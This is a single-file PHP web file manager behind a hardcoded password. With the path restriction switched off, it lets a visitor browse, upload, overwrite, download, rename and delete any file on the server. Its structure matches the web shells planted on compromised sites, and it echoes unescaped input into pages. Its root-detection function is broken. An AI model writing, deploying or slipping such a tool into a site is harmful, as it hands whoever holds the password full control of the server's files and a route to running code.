<?php
/**
 * PHP File Manager
 */
#初始化
$is_otherdir_forbidden = false;
session_start();
define('ROOT', webroot ());
define('FMROOT', strtolower(dirname($_SERVER['SCRIPT_FILENAME'])) . DIRECTORY_SEPARATOR);
function webroot () {
	return $_SERVER['DOCUMENT_ROOT'] || $_SERVER['CONTEXT_DOCUMENT_ROOT'];
}
function checkPW() {
	$pw = isset($_POST['pw']) ? $_POST['pw'] : '';
	if (! isset($_SESSION['pw'])) {
		if ($pw == '像我这样重感情的人') {
			$_SESSION['pw'] = true;
			return true;
		}
	} else {
		return true;
	}
}
function percentosfromweb ($string) {
	$percent = array (
		'#' => '%23',
		'&' => '%26',
		'+' => '%2b',
	);
	return strtr($string, $percent);
}
function mb_basename($path) {
	$path_array = explode('/', $path);
	return end($path_array);
}
function ge_htmlspecialchars($string) {
	return htmlspecialchars ($string, ENT_COMPAT, 'UTF-8');
}

if (checkPW()) {

	$path = isset($_GET['path']) ? $_GET['path'] : FMROOT;
	$os_path = $path;
	$getfiletype = isset($_GET['filetype']) ? $_GET['filetype'] : 'dir';
	$filecontent_encoding = isset($_GET['filecontent_encoding']) ? $_GET['filecontent_encoding'] : '';
	if (stripos($path, ROOT) === false && $is_otherdir_forbidden) {
		echo 'The dir is not accessible';exit;
	}
	
	$mkdir = isset($_POST['mkdir']) ? $_POST['mkdir'] : '';
	if ($mkdir != '') {
		$mkdir = $mkdir;
		mkdir ($mkdir);
	}
	$file = isset($_FILES["file"]) ? $_FILES["file"] : '';
	if ($file != '' && $file['error'] == 0) {
		$file['name'] = $file['name'];
		move_uploaded_file($file['tmp_name'], $os_path . $file['name']);
	}
	
	$filecontent = isset($_POST['filecontent']) ? $_POST['filecontent'] : '';
	if ($filecontent != '') {
		$filecontent_encoding = isset($_POST['filecontent_encoding']) ? $_POST['filecontent_encoding'] : '';
		if ($filecontent_encoding == 'gbk') {
			$filecontent = mb_convert_encoding($filecontent, 'gbk', 'utf-8');
		}
		file_put_contents($path, $filecontent);
	}
	
	$act = isset($_GET['act']) ? $_GET['act'] : '';
	$filename = isset($_GET['filename']) ? $_GET['filename'] : '';
	if ($act == 'download') {
		header('Content-Type: ' . mime_content_type($os_path));
		header('Content-Length: '. filesize($os_path));
		header('Content-Disposition: attachment; filename=' . mb_basename($path));
		readfile($os_path);
		exit;
	}
	$rename = isset($_POST['rename']) ? $_POST['rename'] : '';
	if ($act == 'rename' && $rename) {
		$rename = str_replace(mb_basename($path), $rename, $path);
		rename($os_path, $rename);
	}
}
	
?>
<?php if(! checkPW()):?>
<!doctype html>
<html>
<head>
<meta charset="utf-8" />
</head>
<body>
<form method="post">
	<input name="pw" placeholder="password" /><br />
	<input type="submit" />
</form>
</body>
</html>
<?php else: ?>
<!doctype html>
<html>
<head>
<meta charset="utf-8" />
<style>
body {
	font-size:12px;
}
.filelist tr {
	line-height:30px;
}
.filelist tr:nth-of-type(odd) {
	background-color: #fafafa;
}
.filelist tr:hover {
	background-color: #f0f9ff;
}
.filelist th {
	text-align:left;
	background-color: #f0f9ff;
}
.filelist .imgtype{
	width:30px;
}
.filelist .filename{
	width:400px;
}
.filelist .filemtime{
	width:150px;
}
</style>
</head>
<body>
<a href="?path=<?php echo preg_replace('/\/$/', '', str_replace('\\', '/', dirname($path))) . '/'; ?>">Parent</a>
<?php if ($getfiletype == 'dir'): ?>
<form method="post" enctype="multipart/form-data">
	<input name="mkdir" placeholder="mkdir" /><br />
	<input name="file" type="file" /><br />
	<input type="submit" />
</form>
	<table class="filelist">
		<tr class=""><th class="imgtype"></th><th class="filename">Name</th><th class="filemtime">Size</th><th class="filemtime">Time</th><th class="filemtime">Download</th><th class="filemtime">Rename</th></tr>
<?php
if (is_dir($os_path)) {
	if ($dh = opendir($os_path)) {
		$i=0;
		while (($filename = readdir($dh)) !== false) {
			if ($filename =='.' || $filename =='..' || ! file_exists($os_path . $filename)) {
				continue;
			}
			$i++;
			$os_filepath = $os_path . $filename;
			$filetype = filetype($os_filepath);
			$filemtime = date('Y-m-d H:i:s', filemtime($os_filepath));
			$filesize = filesize($os_filepath);
			$is_writeable = is_writeable($os_filepath);
$del =  '';
if (isset($_GET['del']) && $_GET['del'] ==$i) {
	if (unlink($os_filepath)) {
		$del =  'del success';
	} else {
		$del =  'del false';
	}
}
			$filename = $filename;
			$filepath = percentosfromweb($path . $filename);
			if ($filetype =='dir') {
				$filepath = $filepath;
				$filepathtype = '/&filetype=dir';
				$imgtype = '&#x1f4c1;';
				$file_download = ' --- ';
				$filesize = ' --- ';
			} else {
				$filepath = $filepath;
				$filepathtype = '&filetype=file';
				$imgtype = '&#x1f4c4;';
				$file_download = "<a href=\"?act=download&path=$filepath&filename=$filename\">Download</a>";
			}
			echo "<tr class=\"$filetype\"><td class=\"imgtype\">$imgtype</td><td class=\"filename\"><a href=\"?path=$filepath$filepathtype\">$filename</a></td><td class=\"filemtime\">$filesize</td><td class=\"filemtime\">$filemtime</td><td class=\"filemtime\">$file_download</td><td class=\"filemtime\"><a href=\"?act=rename&path=$filepath&filename=$filename\">Rename</a></td></tr>\r\n";
		}
		closedir($dh);
	}
}
?>
	</table>
<?php endif; ?>
<?php if ($getfiletype == 'file'): ?>
<?php
	$filecontent = file_get_contents($path);
	if ($filecontent_encoding == 'gbk') {
		$filecontent = mb_convert_encoding($filecontent, 'utf-8', 'gbk');
	}
	$filecontent = ge_htmlspecialchars($filecontent);

?>
<a href="<?php echo $_SERVER['REQUEST_URI']; ?>&filecontent_encoding=gbk">gbk</a>
<a href="<?php echo $_SERVER['REQUEST_URI']; ?>&filecontent_encoding=utf-8">utf-8</a>
<form method="post">
	<input name="filecontent_encoding" value="<?php echo $filecontent_encoding; ?>" />
	<textarea name="filecontent" style="width:100%;height:300px;"><?php echo $filecontent; ?></textarea><br />
	<input type="submit" />
</form>
<?php endif; ?>
<?php if ($act == 'rename'): ?>
<?php

	$rename =  mb_basename($path);
?>
<form method="post" enctype="multipart/form-data">
	<input name="rename" placeholder="charset" value="" /><br />
	the old filename: <?php echo $rename; ?>
	<input type="submit" />
</form>
<?php endif; ?>
</body>
</html>
<?php endif; ?>